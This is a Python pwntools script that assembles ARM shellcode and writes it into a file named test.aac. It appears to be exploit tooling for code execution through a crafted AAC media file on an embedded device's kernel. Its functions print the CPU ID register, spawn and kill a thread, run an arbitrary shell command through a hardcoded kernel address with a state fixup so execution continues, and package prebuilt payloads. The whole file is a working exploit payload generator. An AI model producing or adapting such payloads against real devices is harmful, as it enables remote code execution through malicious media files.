from pwn import *

# saves payload that prints cpu id to test.aac
def create_print_cpu_id_aac_code_exec_payload():
    # Assembly instructions
    asm_code = '''
    @ load chip ID register
    mrc p15, #0, r1, c0, c0, #0
    @ print chip ID
    adr r0, fmt_string
    ldr r3, =0xc01a79a0
    blx r3
    @ print fixing state string
    adr r0, fixing_state_string
    ldr r3, =0xc01a79a0
    blx r3
    @ fixup
    ldr r3, =#0xc09ae8d4
    ldr r2, [r3,#0x0]
    ldr r5, =#0x5d4
    ldr r6, =#0xc02202e4
    ldr r7, =#0xc09afec0
    add r11, r2, r5
    blx r6
fmt_string:
    .asciz "\033[35m[PWN]\033[0m CPU ID REGISTER CONTENTS: 0x%x\\n"
fixing_state_string:
    .asciz "\033[35m[PWN]\033[0m FIXING UP STATE\\n"
    '''

    # Convert assembly to machine code
    shellcode = asm(asm_code)

    info("test.aac payload")
    print(hexdump(shellcode))

    # Write the shellcode to the file
    with open('test.aac', 'wb') as f:
        f.write(shellcode)

    success("File 'test.aac' has been written successfully.")

    return len(shellcode)

# saves payload that prints cpu id to test.aac (for running in separate thread)
def create_print_cpu_id_aac_code_exec_payload_thread():
    # Assembly instructions
    # address of thread ID should be at 
    asm_code = '''
    @ print spawned string
    adr r0, spawned_string
    ldr r3, =0xc01a79a0
    blx r3
    @ load chip ID register
    mrc p15, #0, r1, c0, c0, #0
    @ print chip ID
    adr r0, fmt_string
    ldr r3, =0xc01a79a0
    blx r3
    @ print killing self
    adr r0, kill_self_string
    ldr r3, =0xc01a79a0
    blx r3
    @ call pthread_exit
    mov r0, #0x0
    ldr r3, =0xc037f2e4
    blx r3
spawned_string:
    .asciz "\033[35m[PWN]\033[0m THREAD SPAWNED\\n"
fmt_string:
    .asciz "\033[35m[PWN]\033[0m CPU ID REGISTER CONTENTS: 0x%x\\n"
kill_self_string:
    .asciz "\033[35m[PWN]\033[0m KILLING SELF\\n"
    '''

    # Convert assembly to machine code
    shellcode = asm(asm_code)

    info("test.aac payload")
    print(hexdump(shellcode))

    # Write the shellcode to the file
    with open('test.aac', 'wb') as f:
        f.write(shellcode)

    success("File 'test.aac' has been written successfully.")

    return len(shellcode)

# saves payload that executes given command in UART
def run_shell_command_aac_code_exec_payload(cmd):
    # Assembly instructions
    asm_code = f'''
    adr r0, command_string
    ldr r3, =0xc01e4094
    blx r3
    @ fixup
    ldr r3, =#0xc09ae8d4
    ldr r2, [r3,#0x0]
    ldr r5, =#0x5d4
    ldr r6, =#0xc02202e4
    ldr r7, =#0xc09afec0
    add r11, r2, r5
    blx r6
command_string:
    .ascii "{cmd}"
    '''

    # Convert assembly to machine code
    shellcode = asm(asm_code)

    info("test.aac payload")
    print(hexdump(shellcode))

    # Write the shellcode to the file
    with open('test.aac', 'wb') as f:
        f.write(shellcode)

    success("File 'test.aac' has been written successfully.")

    return len(shellcode)

# opens given file, prints it and saves it as test.aac (for running pre-build payloads)
def compiled_code_exec_payload(name):
    shellcode = b''
    with open(name, 'rb') as f:
        shellcode = f.read()

    info("test.aac payload")
    print(hexdump(shellcode))

    # Write the shellcode to the file
    with open('test.aac', 'wb') as f:
        f.write(shellcode)

    success("File 'test.aac' has been written successfully.")

    return len(shellcode)
